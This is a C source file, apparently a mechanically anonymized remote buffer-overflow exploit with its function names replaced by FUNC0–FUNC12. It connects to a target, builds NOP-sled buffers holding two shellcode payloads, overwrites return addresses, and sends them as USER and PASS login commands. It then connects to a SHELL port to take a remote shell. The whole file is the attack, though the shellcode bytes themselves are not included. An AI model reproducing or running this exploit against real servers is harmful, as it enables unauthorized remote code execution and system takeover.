#define NULL ((void*)0)
typedef unsigned long size_t;  // Customize by platform.
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;  // Either arithmetic or pointer type.
/* By default, we understand bool (as a convenience). */
typedef int bool;
#define false 0
#define true 1

/* Forward declarations */

/* Type definitions */
typedef  int /*<<< orphan*/  rcv ;
typedef  int /*<<< orphan*/  buf2 ;
typedef  int /*<<< orphan*/  buf1 ;

/* Variables and functions */
 int SHELL ; 
 int /*<<< orphan*/  FUNC0 (int /*<<< orphan*/ ) ; 
 scalar_t__ FUNC1 (char*,int) ; 
 scalar_t__ debug ; 
 int /*<<< orphan*/  fdsocket ; 
 int /*<<< orphan*/  FUNC2 (int /*<<< orphan*/ ,char*,...) ; 
 int /*<<< orphan*/  FUNC3 () ; 
 int /*<<< orphan*/  FUNC4 (char*,char*,int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC5 (char*,int,int) ; 
 int /*<<< orphan*/  FUNC6 (int /*<<< orphan*/ ) ; 
 int /*<<< orphan*/  FUNC7 (int /*<<< orphan*/ ,char*,int,int) ; 
 char* shellcode_1 ; 
 char* shellcode_2 ; 
 int /*<<< orphan*/  FUNC8 (char*,char*,char*) ; 
 int /*<<< orphan*/  stdout ; 
 int /*<<< orphan*/  FUNC9 (char*) ; 
 int /*<<< orphan*/  FUNC10 (char*) ; 
 int /*<<< orphan*/  FUNC11 (int /*<<< orphan*/ ,char*,int /*<<< orphan*/ ) ; 

int FUNC12 (char *target, int port, int ret, int align)
{
	int i;
	char snd[1024]="", rcv[1024]="";
	char buf1[92], buf2[101];

	int *ebol = (int *)(buf2 + align);

	if (FUNC1(target, port)) /* connect to server */
		FUNC10 ("\n _(0x666)_  Error in connecting to server\n");
	else
		FUNC2 (stdout, " _(0x1)_  Connected (!)\n");

	/* create buffer */
	FUNC5 ((char *)buf1, 0x90, sizeof(buf1));
	FUNC4 ((char *)buf1, shellcode_1, FUNC9(shellcode_1));

	FUNC5 ((char *)buf2, 0x90, sizeof(buf2));
	for (i=0; i<15; i+=4, *ebol++ = ret);

	FUNC4 ((char *)buf2+15+12, shellcode_2, FUNC9(shellcode_2));

	FUNC7 (fdsocket, rcv, sizeof(rcv), 0x0);

	if (debug)
		FUNC2 (stdout, "\n <debug> server resp. : %s\n", rcv);

	FUNC2 (stdout, " _(0x2)_  Sending USER (shellcode_1)\n");

	FUNC8 (snd, "USER %s\n", buf1);
	FUNC11 (fdsocket, snd, FUNC9(snd));
	FUNC7 (fdsocket, rcv, sizeof(rcv), 0x0);

	if (debug)
	{
		FUNC2 (stdout, " <debug> [w8ing ...] run gdb then press [ENTER]\n");
		FUNC3();
	}

	FUNC2 (stdout, " _(0x3)_  Sending PASS (shellcode_2)\n\n");

	FUNC8 (snd, "PASS %s\n", buf2);
	FUNC11 (fdsocket, snd, FUNC9(snd));
	FUNC7 (fdsocket, rcv, sizeof(rcv), 0x0);

	if (debug)
		FUNC2 (stdout, " <debug> server resp. : %s\n", rcv);

	FUNC0 (fdsocket);

	if (!(FUNC1(target, SHELL)))
		FUNC6(fdsocket);
	else
		return 0x666;

	return 0x333;
}